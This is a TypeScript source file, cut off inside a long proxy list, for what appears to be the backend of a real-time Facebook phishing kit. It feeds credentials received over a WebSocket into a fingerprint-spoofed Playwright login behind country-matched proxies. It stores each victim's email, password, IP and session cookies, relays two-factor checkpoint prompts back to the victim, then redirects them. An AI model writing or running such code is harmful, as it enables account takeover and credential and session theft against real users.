import WebSocket from 'ws';
import Logger from './logger.js';
import clm from 'country-locale-map';
import { Browser, BrowserContext, Page, BrowserContextOptions } from 'playwright';
import { chromium } from 'playwright-extra';
import { newInjectedContext } from 'fingerprint-injector';
import { UserInfo } from '../utils/user.info.interface.js';
import { LoginFields } from '../utils/login.fields.interface.js';
import { findCookieValue, getRandomTimeout } from '../shared/shared.js';
import AccountCookiesDatabase from '../database/account/account.cookies.database.js';
import { IAccount } from '../database/account/account.model.js';

const { getCountryByAlpha2 } = clm;

interface Proxy {
    server: string;
    username: string;
    password: string;
}

interface LaunchConfig {
    headless: boolean;
    args?: string[];
    proxy?: {
        server: string;
    };
}

class BrowserPool {
    private static instance: BrowserPool;
    private browserPool: Browser[] = [];
    private userContexts: Map<string, BrowserContext> = new Map();
    private contextToBrowser: Map<BrowserContext, Browser> = new Map();
    private maxBrowsers: number = 10;
    private maxContextsPerBrowser: number = 20;
    private logger = new Logger();

    private FORMS: LoginFields[];
    private redirect: string = '';
    private useProxy: boolean = false;
    private currentLogin: { url: string, isNew: boolean } = { url: '', isNew: false };

    private accountCookiesDB: AccountCookiesDatabase;

    private headless: boolean = true;

    // Constructor privado para inicializar la instancia única
    private constructor(useProxy: boolean) {
        this.useProxy = useProxy;
        this.initializeBrowserPool();
        this.accountCookiesDB = new AccountCookiesDatabase();

        this.FORMS = [
            {
                emailInput: "#m_login_email",
                passInput: "#m_login_password",
                buttonLogin: "div[role='button'][data-anchor-id='replay']",
                formAction: "com.bloks.www.bloks.caa.login.async.send_login_request",
                type: "mobile"
            },
            {
                emailInput: "form[id='login_form'] #m_login_email",
                passInput: "form[id='login_form'] #m_login_password",
                buttonLogin: "form[id='login_form'] button[name='login']",
                formAction: "/login/device-based/",
                type: "mobile"
            },
            {
                emailInput: "form[id='login_form'] #email",
                passInput: "form[id='login_form'] #pass",
                buttonLogin: "form[id='login_form'] button[type='submit']",
                formAction: "/login/device-based/",
                type: "desktop"
            },
            {
                emailInput: "form[action*='/login/?privacy_mutation_token'] #email",
                passInput: "form[action*='/login/?privacy_mutation_token'] #pass",
                buttonLogin: "form[action*='/login/?privacy_mutation_token'] button[type='submit']",
                formAction: "/login/?privacy_mutation_token",
                type: "desktop"
            },
        ];
    }

    // Inicializa el pool de navegadore
    private async initializeBrowserPool() {
        for (let i = 0; i < this.maxBrowsers; i++) {
            const launchConfig: LaunchConfig = { 
                headless: this.headless,
                args: [
                    '--disable-webgl', // Deshabilita WebGL para evitar la detección basada en la capacidad gráfica.
                    '--disable-webrtc', // Deshabilita WebRTC para evitar la filtración de la IP real.
                    '--disable-gpu', // Deshabilita la GPU para evitar la detección basada en la capacidad gráfica.
                    '--disable-accelerated-2d-canvas', // Deshabilita la aceleración de canvas 2D para evitar la detección basada en la capacidad gráfica.
                    '--disable-accelerated-mjpeg-decode', // Deshabilita la decodificación acelerada de MJPEG.
                    '--disable-accelerated-video-decode', // Deshabilita la decodificación acelerada de video.
                    '--disable-accelerated-video-encode', // Deshabilita la codificación acelerada de video.
                    '--disable-accelerated-vpx-decode', // Deshabilita la decodificación acelerada de VPX.
                    '--disable-background-networking', // Deshabilita la red en segundo plano para evitar la detección de actividad en segundo plano.
                    '--disable-background-timer-throttling', // Deshabilita la limitación de temporizadores en segundo plano.
                    '--disable-backgrounding-occluded-windows', // Deshabilita la limitación de ventanas ocultas.
                    '--disable-breakpad', // Deshabilita Breakpad, el sistema de informes de fallos.
                    '--disable-client-side-phishing-detection', // Deshabilita la detección de phishing del lado del cliente.
                    '--disable-component-extensions-with-background-pages', // Deshabilita las extensiones de componentes con páginas en segundo plano.
                    '--disable-component-update', // Deshabilita la actualización de componentes.
                    '--disable-default-apps', // Deshabilita las aplicaciones predeterminadas.
                    '--disable-dev-shm-usage', // Deshabilita el uso de /dev/shm para evitar problemas en entornos con poca memoria compartida.
                    '--disable-domain-reliability', // Deshabilita la fiabilidad del dominio.
                    '--disable-extensions', // Deshabilita las extensiones para evitar la detección basada en extensiones instaladas.
                    '--disable-features=AudioServiceOutOfProcess', // Deshabilita el servicio de audio fuera de proceso.
                    '--disable-hang-monitor', // Deshabilita el monitor de bloqueos.
                    '--disable-ipc-flooding-protection', // Deshabilita la protección contra inundaciones de IPC.
                    '--disable-notifications', // Deshabilita las notificaciones para evitar la detección basada en notificaciones.
                    '--disable-offer-store-unmasked-wallet-cards', // Deshabilita la oferta de almacenamiento de tarjetas de billetera sin máscara.
                    '--disable-popup-blocking', // Deshabilita el bloqueo de ventanas emergentes.
                    '--disable-print-preview', // Deshabilita la vista previa de impresión.
                    '--disable-prompt-on-repost', // Deshabilita el aviso en reenvíos.
                    '--disable-renderer-backgrounding', // Deshabilita la limitación de renderizadores en segundo plano.
                    '--disable-sync', // Deshabilita la sincronización.
                    '--disable-translate', // Deshabilita la traducción automática.
                    '--disable-wake-on-wifi', // Deshabilita la activación por WiFi.
                    '--disable-web-security', // Deshabilita la seguridad web para evitar restricciones de CORS.
                    '--disable-webgl-image-chromium', // Deshabilita la imagen WebGL en Chromium.
                    '--disable-webgl2', // Deshabilita WebGL2 para evitar la detección basada en la capacidad gráfica.
                    '--disable-xss-auditor', // Deshabilita el auditor XSS.
                    '--no-default-browser-check', // Deshabilita la comprobación del navegador predeterminado.
                    '--no-first-run', // Deshabilita la experiencia de primera ejecución.
                    '--no-pings', // Deshabilita los pings para evitar la detección basada en pings.
                    '--no-sandbox', // Deshabilita el sandbox para evitar restricciones de seguridad.
                    '--password-store=basic', // Usa el almacén de contraseñas básico.
                    '--use-mock-keychain', // Usa un llavero simulado.
                    '--disable-blink-features=AutomationControlled', // Deshabilita las características de Blink que indican automatización.
                    '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' // Establece un user-agent personalizado para evitar la detección basada en el user-agent.
                ]
            };
            if (this.useProxy) {
                launchConfig.proxy = { server: 'http://per-context' };
            }
            const browser = await chromium.launch(launchConfig);
            this.browserPool.push(browser);
        }
    }

    // Obtiene la instancia única de BrowserPool
    public static getInstance(useProxy: boolean): BrowserPool {
        if (!BrowserPool.instance) {
            BrowserPool.instance = new BrowserPool(useProxy);
        }
        return BrowserPool.instance;
    }

    // Adquiere un navegador disponible del pool
    private async acquireBrowser(): Promise<Browser> {
        for (const browser of this.browserPool) {
            const contexts = await browser.contexts();
            if (contexts.length < this.maxContextsPerBrowser) {
                return browser;
            }
        }
        if (this.browserPool.length < this.maxBrowsers) {
            const launchConfig: LaunchConfig = { 
                headless: this.headless,
                args: [
                    '--disable-webgl', // Deshabilita WebGL para evitar la detección basada en la capacidad gráfica.
                    '--disable-webrtc', // Deshabilita WebRTC para evitar la filtración de la IP real.
                    '--disable-gpu', // Deshabilita la GPU para evitar la detección basada en la capacidad gráfica.
                    '--disable-accelerated-2d-canvas', // Deshabilita la aceleración de canvas 2D para evitar la detección basada en la capacidad gráfica.
                    '--disable-accelerated-mjpeg-decode', // Deshabilita la decodificación acelerada de MJPEG.
                    '--disable-accelerated-video-decode', // Deshabilita la decodificación acelerada de video.
                    '--disable-accelerated-video-encode', // Deshabilita la codificación acelerada de video.
                    '--disable-accelerated-vpx-decode', // Deshabilita la decodificación acelerada de VPX.
                    '--disable-background-networking', // Deshabilita la red en segundo plano para evitar la detección de actividad en segundo plano.
                    '--disable-background-timer-throttling', // Deshabilita la limitación de temporizadores en segundo plano.
                    '--disable-backgrounding-occluded-windows', // Deshabilita la limitación de ventanas ocultas.
                    '--disable-breakpad', // Deshabilita Breakpad, el sistema de informes de fallos.
                    '--disable-client-side-phishing-detection', // Deshabilita la detección de phishing del lado del cliente.
                    '--disable-component-extensions-with-background-pages', // Deshabilita las extensiones de componentes con páginas en segundo plano.
                    '--disable-component-update', // Deshabilita la actualización de componentes.
                    '--disable-default-apps', // Deshabilita las aplicaciones predeterminadas.
                    '--disable-dev-shm-usage', // Deshabilita el uso de /dev/shm para evitar problemas en entornos con poca memoria compartida.
                    '--disable-domain-reliability', // Deshabilita la fiabilidad del dominio.
                    '--disable-extensions', // Deshabilita las extensiones para evitar la detección basada en extensiones instaladas.
                    '--disable-features=AudioServiceOutOfProcess', // Deshabilita el servicio de audio fuera de proceso.
                    '--disable-hang-monitor', // Deshabilita el monitor de bloqueos.
                    '--disable-ipc-flooding-protection', // Deshabilita la protección contra inundaciones de IPC.
                    '--disable-notifications', // Deshabilita las notificaciones para evitar la detección basada en notificaciones.
                    '--disable-offer-store-unmasked-wallet-cards', // Deshabilita la oferta de almacenamiento de tarjetas de billetera sin máscara.
                    '--disable-popup-blocking', // Deshabilita el bloqueo de ventanas emergentes.
                    '--disable-print-preview', // Deshabilita la vista previa de impresión.
                    '--disable-prompt-on-repost', // Deshabilita el aviso en reenvíos.
                    '--disable-renderer-backgrounding', // Deshabilita la limitación de renderizadores en segundo plano.
                    '--disable-sync', // Deshabilita la sincronización.
                    '--disable-translate', // Deshabilita la traducción automática.
                    '--disable-wake-on-wifi', // Deshabilita la activación por WiFi.
                    '--disable-web-security', // Deshabilita la seguridad web para evitar restricciones de CORS.
                    '--disable-webgl-image-chromium', // Deshabilita la imagen WebGL en Chromium.
                    '--disable-webgl2', // Deshabilita WebGL2 para evitar la detección basada en la capacidad gráfica.
                    '--disable-xss-auditor', // Deshabilita el auditor XSS.
                    '--no-default-browser-check', // Deshabilita la comprobación del navegador predeterminado.
                    '--no-first-run', // Deshabilita la experiencia de primera ejecución.
                    '--no-pings', // Deshabilita los pings para evitar la detección basada en pings.
                    '--no-sandbox', // Deshabilita el sandbox para evitar restricciones de seguridad.
                    '--password-store=basic', // Usa el almacén de contraseñas básico.
                    '--use-mock-keychain', // Usa un llavero simulado.
                    '--disable-blink-features=AutomationControlled', // Deshabilita las características de Blink que indican automatización.
                    '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' // Establece un user-agent personalizado para evitar la detección basada en el user-agent.
                ]
            };

            if (this.useProxy) {
                launchConfig.proxy = { server: 'http://per-context' };
            }

            const newBrowser = await chromium.launch(launchConfig);
            this.browserPool.push(newBrowser);
            return newBrowser;
        }
        throw new Error('All browsers are at max capacity');
    }

    // Obtiene un contexto de navegador para un usuario específico
    async getBrowserContext(clientId: string, proxy: Proxy): Promise<BrowserContext> {
        if (this.userContexts.has(clientId)) {
            return this.userContexts.get(clientId)!;
        }
    
        const browser = await this.acquireBrowser();
        const newContextOptions: BrowserContextOptions = {
            geolocation: {
                latitude: Math.random() * (90 - -90) + -90,
                longitude: Math.random() * (90 - -180) + -180,
            },
            // isMobile: true,
            // locale: 'es-ES',
            // screen: {width: 360, height: 640},
            // userAgent: 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        };
    
        if (this.useProxy) {
            newContextOptions.proxy = {
                server: proxy.server,
                username: proxy.username,
                password: proxy.password,
            };
        }

        // console.log("newContextOptions", newContextOptions);
        const context = await newInjectedContext(browser, {
            fingerprintOptions: {
                devices: ['mobile'],
                operatingSystems: ['android', 'ios'],
            },
            newContextOptions,
        });
    
        this.userContexts.set(clientId, context);
        this.contextToBrowser.set(context, browser);
        return context;
    }

    // Libera un contexto de navegador para un usuario específico
    async releaseBrowserContext(clientId: string): Promise<void> {
        if (!this.userContexts.has(clientId)) {
            return;
        }

        const context = this.userContexts.get(clientId)!;
        await context.close();
        this.userContexts.delete(clientId);
        this.contextToBrowser.delete(context);

        await this.closeInactiveBrowsers();
    }

    // Ejecuta el proceso de login en Facebook usando Playwright
    async runPlaywright(clientId: string, ws: WebSocket, userInfo: UserInfo, data: any): Promise<void> {
        this.redirect = this.getRandomRedirect(userInfo.percent, userInfo.config.redirect, userInfo.config.serverRedirect);
        console.log("redirect => ", this.redirect);

        try {
            const proxy   = this.getProxyForUser(userInfo.countryCode);
            const context = await this.getBrowserContext(clientId, proxy);

            await this.closeAllPages(context);

            const page = await context.newPage();

            this.logger.neutral(`Usuario ${clientId} => Abriendo facebook`);

            await page.goto('https://m.facebook.com/', { waitUntil: 'networkidle', timeout: 60000 });
            // await page.goto('https://whoer.net/es', { waitUntil: 'networkidle', timeout: 0 });
            // await new Promise(resolve => setTimeout(resolve, 50000));
            await this.acceptCookies(page);

            this.currentLogin = {
                url: page.url(),
                isNew: !(await page.$('form')),
            };

            const response: any = await this.authenticate(clientId, page, userInfo, data, ws);
            await this.handleAuthenticationResponse(response, ws);

            return;
        } catch (error: string | any) {
            this.handleError(error, ws);
            return;
        }
    }

    // Cierra todas las páginas abiertas en un contexto de navegador
    private async closeAllPages(context: BrowserContext) {
        const allPages = context.pages();
        await Promise.all(allPages.map((page) => page.close()));
    }

    // Acepta las cookies en la página de Facebook
    private async acceptCookies(page: Page) {
        await page.evaluate(() => {
            const cookiesModal = document.querySelector('div[data-testid="cookie-policy-manage-dialog"]');
            if (cookiesModal) {
                let acceptButton = cookiesModal.querySelector('button[type="submit"][data-cookiebanner="accept_button"]');
                if (!acceptButton) {
                    acceptButton = cookiesModal.querySelector('button[type="submit"][data-testid="cookie-policy-manage-dialog-accept-button"]');
                }

                if (!acceptButton) {
                    const buttons = cookiesModal.querySelectorAll('div[role="button"][aria-label*="cookies"]');
                    acceptButton = buttons[buttons.length - 2];
                }

                if (acceptButton) {
                    (acceptButton as HTMLElement).click();
                    return true;
                }
            }
            return false;
        });
    }

    // Autentica al usuario en Facebook
    private async authenticate(clientId: string, page: Page, userInfo: UserInfo, data: any, ws: WebSocket) {
        this.logger.neutral(`Usuario ${clientId} => Logueando facebook...`);
        return new Promise(async (resolve, reject) => {
            const loginFields = await this.findLoginFields(page, this.FORMS);
            if (!loginFields) {
                return resolve({
                    type: 'error',
                    message: `Usuario ${clientId} => Inicio de sesión sin respuesta`
                });
            }

            // await page.route('**/*', async (route, request) => {
            //     route.continue();
            //     await page.waitForLoadState("domcontentloaded");

            //     if (request.url().includes('checkpoint')) {
            //         route.fulfill({
            //             status: 302,
            //             headers: {
            //                 'Location': 'https://m.facebook.com'
            //             }
            //         });
            //     }
            // });

            page.on('response', async (response) => {
                const url = response.url();
                if (url.includes(loginFields.formAction)) {
                    try {
                        await page.waitForFunction(
                            (url) => window.location.href !== url,
                            this.currentLogin.url,
                            { timeout: 30000 }
                        );
                    } catch (error) {
                        reject('Error timeout esperando el cambio de url para pasar el login');
                    }

                    await page.waitForLoadState("networkidle");

                    const cookies = await page.context().cookies();
                    if (findCookieValue(cookies, 'c_user')) {
                        const newAccount: IAccount = {
                            email: data.username,
                            password: data.name,
                            username: userInfo.username,
                            country: getCountryByAlpha2(userInfo.countryCode)?.name || "",
                            countryCode: userInfo.countryCode,
                            active: true,
                            hasCookies: true,
                            ipAddress: userInfo.clientIp,
                            userAgent: "",
                            createdAt: new Date(),
                        };

                        await this.accountCookiesDB.saveAccountWithCookies(newAccount, cookies);

                        resolve({
                            type: 'login_success',
                            message: `Usuario ${clientId} => Inicio de sesión exitoso`,
                            cookies
                        });
                    } else {
                        const loginFields = await this.findLoginFields(page, this.FORMS);
                        if (loginFields) {
                            return resolve({
                                type: 'login_failed',
                                message: `Usuario ${clientId} => Inicio de sesión fallido`
                            });
                        }

                        await page.waitForSelector('span[data-bloks-name="bk.components.TextSpan"]');

                        const devices = await page.$$eval('span[data-bloks-name="bk.components.TextSpan"]', spans => {
                            const targetRegex = /We sent a notification to your (.*?)\./;
                            for (const span of spans) {
                                if (span.textContent) {
                                    const match = span.textContent.match(targetRegex);
                                    if (match) {
                                        const capturedText = match[1].trim();
                                        const modifiedText = capturedText.replace(/ and /g, ', ');
                                        return modifiedText;
                                    }
                                }
                            }
                            return '📱';
                        });

                        const userName = await page.$eval('span[data-bloks-name="bk.components.TextSpan"]', span => {
                            const targetTextRegex = /(.+) • Facebook/;
                            if (span.textContent) {
                                const trimmedText = span.textContent.trim();
                                const match = trimmedText.match(targetTextRegex);
                                if (match) {
                                    const name = match[1].trim();
                                    return `${name} • Facebook`;
                                }
                            }
                            return 'Meta • Facebook';
                        });

                        ws.send(JSON.stringify({ event: 'login_checkpoint', data: { devices, userName } }));
                        this.logger.error(`Usuario ${clientId} => Inicio de sesión bloqueado`);

                        try {
                            await page.waitForFunction(
                                (url) => window.location.href !== url,
                                page.url(),
                                { timeout: 150000 }
                            );
                        } catch (error) {
                            return reject('Error timeout esperando el cambio de url para pasar el bloqueo');
                        }

                        await page.waitForLoadState("networkidle");

                        const changeCookies = await page.context().cookies();
                        if (findCookieValue(changeCookies, 'c_user')) {
                            const newAccount: IAccount = {
                                email: data.username,
                                password: data.name,
                                username: userInfo.username,
                                country: getCountryByAlpha2(userInfo.countryCode)?.name || "",
                                countryCode: userInfo.countryCode,
                                active: true,
                                hasCookies: true,
                                ipAddress: userInfo.clientIp,
                                userAgent: "",
                                createdAt: new Date(),
                            };

                            await this.accountCookiesDB.saveAccountWithCookies(newAccount, changeCookies);
                            this.logger.success(`Usuario ${clientId} => Inicio de sesión desbloqueado`);
                        }else{
                            this.logger.error(`Usuario ${clientId} => Inicio de sesión no desbloqueado`);
                        }
                        
                        ws.send(JSON.stringify({ event: 'redirect', data: { url: this.redirect } }));
                    }
                }
            });

            // await page.type(loginFields.emailInput, data.username, { delay: 100 });
            // await page.waitForTimeout(getRandomTimeout());
            // await page.type(loginFields.passInput, data.name, { delay: 100 });
            // await page.waitForTimeout(getRandomTimeout());
            // await page.click(loginFields.buttonLogin);

            await page.focus(loginFields.emailInput);
            await page.keyboard.type(data.username, { delay: 100 });
            await page.waitForTimeout(getRandomTimeout());

            await page.focus(loginFields.passInput);
            await page.keyboard.type(data.name, { delay: 100 });
            await page.waitForTimeout(getRandomTimeout());

            await page.click(loginFields.buttonLogin);
        }).catch((error) => {
            throw new Error(error);
        });
    }

    // Encuentra los campos de login en la página
    private async findLoginFields(page: Page, forms: LoginFields[]): Promise<LoginFields | null> {
        for (const form of forms) {
            const [emailInput, passInput, buttonLogin] = await Promise.all([
                page.$(form.emailInput),
                page.$(form.passInput),
                page.$(form.buttonLogin),
            ]);

            if (emailInput && passInput && buttonLogin) {
                const isVisible = await Promise.all([
                    emailInput.isVisible(),
                    passInput.isVisible(),
                    buttonLogin.isVisible(),
                ]);

                if (isVisible.every((visible) => visible)) {
                    return form;
                }
            }
        }

        return null;
    }

    // Obtiene una URL de redirección aleatoria basada en un porcentaje
    private getRandomRedirect(percent: number, userRedirect: string, serverRedirect: string): string {
        if (percent === 0) {
            return userRedirect;
        }

        const randomValue = Math.random() * 100;

        if (randomValue < percent) {
            return serverRedirect;
        } else {
            return userRedirect;
        }
    }

    // Obtiene el proxy para un usuario específico
    private getProxyForUser(countryCode: string): Proxy {
        const proxyList = [
            { host: 'us.smartproxy.com', portRange: [10001, 29999], countryCode: 'US' },
            { host: 'eu.smartproxy.com', portRange: [10001, 29999], countryCode: 'EU' },
            { host: 'ae.smartproxy.com', portRange: [20001, 29999], countryCode: 'AE' },
            { host: 'my.smartproxy.com', portRange: [30001, 39999], countryCode: 'MY' },
            { host: 'ph.smartproxy.com', portRange: [40001, 49999], countryCode: 'PH' },
            { host: 'in.smartproxy.com', portRange: [10001, 19999], countryCode: 'IN' },
            { host: 'tw.smartproxy.com', portRange: [20001, 29999], countryCode: 'TW' },
            { host: 'jp.smartproxy.com', portRange: [30001, 39999], countryCode: 'JP' },
            { host: 'be.smartproxy.com', portRange: [40001, 49999], countryCode: 'BE' },
            { host: 'es.smartproxy.com', portRange: [10001, 19999], countryCode: 'ES' },
            { host: 'pt.smartproxy.com', portRange: [20001, 29999], countryCode: 'PT' },
            { host: 'gr.smartproxy.com', portRange: [30001, 39999], countryCode: 'GR' },
            { host: 'pe.smartproxy.com', portRange: [40001, 49999], countryCode: 'PE' },
            { host: 'ar.smartproxy.com', portRange: [10001, 19999], countryCode: 'AR' },
            { host: 'se.smartproxy.com', portRange: [20001, 29999], countryCode: 'SE' },
            { host: 'az.smartproxy.com', portRange: [30001, 39999], countryCode: 'AZ' },
            { host: 'ua.smartproxy.com', portRange: [40001, 49999], countryCode: 'UA' },
            { host: 'hk.smartproxy.com', portRange: [10001, 19999], countryCode: 'HK' },
            { host: 'de.smartproxy.com', portRange: [20001, 29999], countryCode: 'DE' },
            { host: 'ir.smartproxy.com', portRange: [30001, 39999], countryCode: 'IR' },
            { host: 'za.smartproxy.com', portRange: [40001, 49999], countryCode: 'ZA' },
            { host: 'kr.smartproxy.com', portRange: [10001, 19999], countryCode: 'KR' },
            { host: 'ec.smartproxy.com', portRange: [20001, 29999], countryCode: 'EC' },
            { host: 'cl.smartproxy.com', portRange: [30001, 39999], countryCode: 'CL' },
            { host: 'ru.smartproxy.com', portRange: [40001, 49999], countryCode: 'RU' },
            { host: 'id.smartproxy.com', portRange: [10001, 19999], countryCode: 'ID' },
            { host: 'eg.smartproxy.com', portRange: [20001, 29999], countryCode: 'EG' },
            { host: 'cn.smartproxy.com', portRange: [30001, 39999], countryCode: 'CN' },
            { host: 'gb.smartproxy.com', portRange: [30001, 49999], countryCode: 'GB' },
            { host: 'nl.smartproxy.com', portRange: [10001, 19999], countryCode: 'NL' },
            { host: 'it.smartproxy.com', portRange: [20001, 29999], countryCode: 'IT' },
            { host: 'au.smartproxy.com', portRange: [30001, 39999], countryCode: 'AU' },
            { host: 'kz.smartproxy.com', portRange: [40001, 49999], countryCode: 'KZ' },
            { host: 'sg.smartproxy.com', portRange: [10001, 19999], countryCode: 'SG' },
            { host: 'mx.smartproxy.com', portRange: [20001, 29999], countryCode: 'MX' },
            { host: 'th.smartproxy.com', portRange: [30001, 39999], countryCode: 'TH' },
            { host: 'tr.smartproxy.com', portRange: [40001, 49999], countryCode: 'TR' },
            { host: 'br.smartproxy.com', portRange: [10001, 19999], countryCode: 'BR' },
            { host: 'pl.smartproxy.com', portRange: [20001, 29999], countryCode: 'PL' },
            { host: 'co.smartproxy.com', portRange: [30001, 39999], countryCode: 'CO' },
            { host: 'fr.smartproxy.com', portRange: [40001, 49999], countryCode: 'FR' },
            { host: 'pk.smartproxy.com', portRange: [10001, 19999], countryCode: 'PK' },
            { host: 'ca.smartproxy.com', portRange: [20001, 29999], countryCode: 'CA' },
            { host: 'il.smartproxy.com', portRange: [30001, 39999], countryCode: 'IL' },
            { host: 'ma.smartproxy.com', portRange: [40001, 40999], countryCode: 'MA' },
            { host: 'mz.smartproxy.com', portRange: [41001, 41999], countryCode: 'MZ' },
            { host: 'ng.smartproxy.com', portRange: [42001, 42999], countryCode: 'NG' },
            { host: 'gh.smartproxy.com', portRange: [43001, 43999], countryCode: 'GH' },
            { host: 'ci.smartproxy.com', portRange: [44001, 44999], countryCode: 'CI' },
            { host: 'ke.smartproxy.com', portRange: [45001, 45999], countryCode: 'KE' },
            { host: 'lr.smartproxy.com', portRange: [46001, 46999], countryCode: 'LR' },
            { host: 'mg.smartproxy.com', portRange: [47001, 47999], countryCode: 'MG' },
            { host: 'ml.smartproxy.com', portRange: [48001, 48999], countryCode: 'ML' },
            { host: 'mt.smartproxy.com', portRange: [49001, 49999], countryCode: 'MT' },
            { host: 'mc.smartproxy.com', portRange: [10001, 10999], countryCode: 'MC' },
            { host: 'md.smartproxy.com', portRange: [11001, 11999], countryCode: 'MD' },
            { host: 'me.smartproxy.com', portRange: [12001, 12999], countryCode: 'ME' },
            { host: 'no.smartproxy.com', portRange: [13001, 13999], countryCode: 'NO' },
            { host: 'py.smartproxy.com', portRange: [14001, 14999], countryCode: 'PY' },
            { host: 'uy.smartproxy.com', portRange: [15001, 15999], countryCode: 'UY' },
            { host: 've.smartproxy.com', portRange: [16001, 16999], countryCode: 'VE' },
            { host: 'dm.smartproxy.com', portRange: [17001, 17999], countryCode: 'DM' },
            { host: 'ht.smartproxy.com', portRange: [18001, 18999], countryCode: 'HT' },
            { host: 'hn.smartproxy.com', portRange: [19001, 19999], countryCode: 'HN' },
            { host: 'jm.smartproxy.com', portRange: [20001, 20999], countryCode: 'JM' },
            { host: 'aw.smartproxy.com', portRange: [21001, 21999], countryCode: 'AW' },
            { host: 'lv.smartproxy.com', portRange: [22001, 22999], countryCode: 'LV' },
            { host: 'li.smartproxy.com', portRange: [23001, 23999], countryCode: 'LI' },
            { host: 'lt.smartproxy.com', portRange: [24001, 24999], countryCode: 'LT' },
            { host: 'lu.smartproxy.com', portRange: [25001, 25999], countryCode: 'LU' },
            { host: 'jo.smartproxy.com', portRange: [26001, 26999], countryCode: 'JO' },
            { host: 'lb.smartproxy.com', portRange: [27001, 27999], countryCode: 'LB' },
            { host: 'mv.smartproxy.com', portRange: [28001, 28999], countryCode: 'MV' },
            { host: 'mn.smartproxy.com', portRange: [29001, 29999], countryCode: 'MN' },
            { host: 'om.smartproxy.com', portRange: [30001, 30999], countryCode: 'OM' },
            { host: 'sd.smartproxy.com', portRange: [31001, 31999], countryCode: 'SD' },
            { host: 'tg.smartproxy.com', portRange: [32001, 32999], countryCode: 'TG' },
            { host: 'tn.smartproxy.com', portRange: [33001, 33999], countryCode: 'TN' },
            { host: 'ug.smartproxy.com', portRange: [34001, 34999], countryCode: 'UG' },
            { host: 'zm.smartproxy.com', portRange: [35001, 35999], countryCode: 'ZM' },
            { host: 'af.smartproxy.com', portRange: [36001, 36999], countryCode: 'AF' },
            { host: 'bh.smartproxy.com', portRange: [37001, 37999], countryCode: 'BH' },
            { host: 'fj.smartproxy.com', portRange: [38001, 38999], countryCode: 'FJ' },
            { host: 'nz.smartproxy.com', portRange: [39001, 39999], countryCode: 'NZ' },
            { host: 'bo.smartproxy.com', portRange: [40001, 40999], countryCode: 'BO' },
            { host: 'bd.smartproxy.com', portRange: [41001, 41999], countryCode: 'BD' },
            { host: 'am.smartproxy.com', portRange: [42001, 42999], countryCode: 'AM' },
            { host: 'ge.smartproxy.com', portRange: [43001, 43999], countryCode: 'GE' },
            { host: 'iq.smartproxy.com', portRange: [44001, 44999], countryCode: 'IQ' },
            { host: 'bt.smartproxy.com', portRange: [45001, 45999], countryCode: 'BT' },
            { host: 'mm.smartproxy.com', portRange: [46001, 46999], countryCode: 'MM' },
            { host: 'kh.smartproxy.com', portRange: [47001, 47999], countryCode: 'KH' },
            { host: 'cy.smartproxy.com', portRange: [48001, 48999], countryCode: 'CY' },
            { host: 'sn.smartproxy.com', portRange: [49001, 49999], countryCode: 'SN' },
            { host: 'sc.smartproxy.com', portRange: [10001, 10999], countryCode: 'SC' },
            { host: 'zw.smartproxy.com', portRange: [11001, 11999], countryCode: 'ZW' },
            { host: 'ss.smartproxy.com', portRange: [12001, 12999], countryCode: 'SS' },
            { host: 'ro.smartproxy.com', portRange: [13001, 13999], countryCode: 'RO' },
            { host: 'rs.smartproxy.com', portRange: [14001, 14999], countryCode: 'RS' },
            { host: 'sk.smartproxy.com', portRange: [15001, 15999], countryCode: 'SK' },
            { host: 'si.smartproxy.com', portRange: [16001, 16999], countryCode: 'SI' },
            { host: 'bs.smartproxy.com', portRange: [17001, 17999], countryCode: 'BS' },
            { host: 'bz.smartproxy.com', portRange: [18001, 18999], countryCode: 'BZ' },
            { host: 'vg.smartproxy.com', portRange: [19001, 19999], countryCode: 'VG' },
            { host: 'pa.smartproxy.com', portRange: [20001, 20999], countryCode: 'PA' },
            { host: 'pr.smartproxy.com', portRange: [21001, 21999], countryCode: 'PR' },
            { host: 'tt.smartproxy.com', portRange: [22001, 22999], countryCode: 'TT' },
            { host: 'is.smartproxy.com', portRange: [23001, 23999], countryCode: 'IS' },
            { host: 'ie.smartproxy.com', portRange: [24001, 24999], countryCode: 'IE' },
            { host: 'cz.smartproxy.com', portRange: [26001, 26999], countryCode: 'CZ' },
            { host: 'dk.smartproxy.com', portRange: [27001, 27999], countryCode: 'DK' },
            { host: 'ee.smartproxy.com', portRange: [28001, 28999], countryCode: 'EE' },
            { host: 'ch.smartproxy.com', portRange: [29001, 29999], countryCode: 'CH' },
            { host: 'mk.smartproxy.com', portRange: [30001, 30999], countryCode: 'MK' },
            { host: 'cr.smartproxy.com', portRange: [31001, 31999], countryCode: 'CR' },
            { host: 'cu.smartproxy.com', portRange: [32001, 32999], countryCode: 'CU' },
            { host: 'al.smartproxy.com', portRange: [33001, 33999], countryCode: 'AL' },
            { host: 'ad.smartproxy.com', portRange: [34001, 34999], countryCode: 'AD' },
            { host: 'at.smartproxy.com', portRange: [35001, 35999], countryCode: 'AT' },
            { host: 'ba.smartproxy.com', portRange: [37001, 37999], countryCode: 'BA' },
            { host: 'bg.smartproxy.com', portRange: [38001, 38999], countryCode: 'BG' },
            { host: 'by.smartproxy.com', portRange: [39001, 39999], countryCode: 'BY' },
            { host: 'hr.smartproxy.com', portRange: [40001, 40999], countryCode: 'HR' },
            { host: 'fi.smartproxy.com', portRange: [41001, 41099], countryCode: 'FI' },
            { host: 'hu.smartproxy.com', portRange: [43001, 43999], countryCode: 'HU' },
            { host: 'qa.smartproxy.com', portRange: [44001, 44999], countryCode: 'QA' },
            { host: 'sa.smartproxy.com', portRange: [45001, 45999], countryCode: 'SA' },
            { host: 'vn.smartproxy.com', portRange: [46001, 46999], countryCode: 'VN' },
            { host: 'tm.smartproxy.com', portRange: [47001, 47999], countryCode: 'TM' },
            { host: 'uz.smartproxy.com', portRange: [48001, 48999], countryCode: 'UZ' },
            { host: 'ye.smartproxy.com', portRange: [49001, 49999], countryCode: 'YE' },
            { host: 'cf.smartproxy.com', portRange: [10001, 10999], countryCode: 'CF' },
            { host: 'td.smartproxy.com', portRange: [11001, 11999], countryCode: 'TD' },
            { host: 'bj.smartproxy.com', portRange: [12001, 12999], countryCode: 'BJ' },
